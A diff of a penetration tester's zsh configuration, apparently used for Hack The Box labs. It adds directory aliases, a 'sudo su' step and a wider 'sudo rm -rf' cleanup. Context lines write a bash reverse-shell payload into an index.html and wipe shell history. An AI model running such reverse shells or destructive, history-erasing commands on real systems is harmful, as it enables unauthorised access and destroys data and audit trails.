@@ -4,7 +4,6 @@ PROMPT="%F{red}[%f%F{cyan}$USER%f%F{red}]─[%f%F{green}%d%f%F{red}]%f""%F{red}%
 export PATH=/home/kermit/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:/root/.local/bin:PATH
 
 # Add as ~/.zshrc
-
 export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
 export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
 
@@ -29,7 +28,9 @@ function rot13()
 }
 
 # alias
-
+alias dis='dirs -v'
+alias pop='popd'
+alias pus='pushd'
 # Alias's for multiple directory listing commands
 alias la='ls -Alh' # show hidden files
 alias ls='ls -aFh --color=always' # add colors and file type extensions
@@ -310,7 +311,9 @@ if [ "$IFACE" = "tun0" ]; then
   touch /home/kermit/maquinas/$nombre_maquina/index.html
   chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  cd /home/kermit/maquinas/$nombre_maquina
+  sudo su
+  pushd /home/kermit/
+  pushd /home/kermit/maquinas/$nombre_maquina
   echo "\n"
   lsd -la
   echo "\n\n"
@@ -348,7 +351,7 @@ else
 fi
 
 echo -ne "\n\t${blue}[+]${endcolor} Borrados archivos alterados"
-sudo rm -rf /home/kermit/maquinas/$nombre_maquina
+sudo rm -rf /home/kermit/maquinas/*
 echo "" > /home/kermit/.zsh_history
 echo "" > /home/kermit/.config/bin/target.txt
 echo "" > /home/kermit/.config/bin/name.txt
